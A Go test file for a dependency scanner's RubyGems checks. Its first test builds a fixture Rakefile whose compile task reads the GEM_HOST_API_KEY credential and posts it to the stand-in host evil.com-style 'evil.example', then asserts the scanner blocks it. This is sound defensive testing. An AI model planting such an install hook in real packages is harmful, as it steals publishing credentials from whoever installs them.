package rubygems

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/check"
	"ihbv.io/depsnort/internal/check/builtin"
	"ihbv.io/depsnort/internal/graph"
)

// runVC002 runs the capability-driven VC-002 family and tallies findings by ID.
func runVC002(g *graph.Graph) map[string]int {
	ctx := &check.Context{Graph: g}
	counts := map[string]int{}
	for _, c := range []check.Check{
		builtin.HookNetwork{},      // VC-002b
		builtin.HookCredentials{},  // VC-002c
		builtin.HookExfilCapable{}, // VC-002d (block)
		builtin.HookObfuscated{},   // VC-002e
	} {
		for _, f := range c.Run(ctx) {
			counts[f.CheckID]++
		}
	}
	return counts
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func rootedGraph(name, ver string) *graph.Graph {
	g := graph.New()
	id := "pkg:gem/" + name + "@" + ver
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: "gem", Name: name, Version: ver, Depth: 0})
	g.MarkRoot(id)
	return g
}

// TestGemRakefileCompilePayloadBlocks is the Item 3a regression: a gem with no
// extconf.rb but a rake-compiler Rakefile declaring a native "compile" task
// that reads a credential and exfiltrates it must still fire VC-002d. Before
// this fix, Rakefile:compile was declared in RubyInstallHookNames but never
// implemented, so this exact shape produced zero findings.
func TestGemRakefileCompilePayloadBlocks(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "Rakefile"), `
require 'rake/extensiontask'
Rake::ExtensionTask.new('evilgem')

task :compile do
  key = ENV['GEM_HOST_API_KEY']
  Net::HTTP.post(URI('https://evil.example/c'), key)
end
`)
	g := rootedGraph("evilgem", "0.1.0")
	if err := New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("Rakefile:compile reading GEM_HOST_API_KEY and reaching the network must BLOCK (VC-002d); got %v", c)
	}
}

// TestGemOrdinaryRakefileSilent asserts a Rakefile with no compile task (the
// overwhelmingly common case — test tasks, doc tasks, etc.) produces no
// install-surface hook at all, not just an empty-capability one.
func TestGemOrdinaryRakefileSilent(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "Rakefile"), `
require 'rake/testtask'
task :default => :test
Rake::TestTask.new do |t|
  t.libs << 'test'
end
`)
	g := rootedGraph("honestgem", "0.1.0")
	if err := New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); len(c) != 0 {
		t.Errorf("an ordinary Rakefile with no compile task must not fire any VC-002 finding; got %v", c)
	}
}
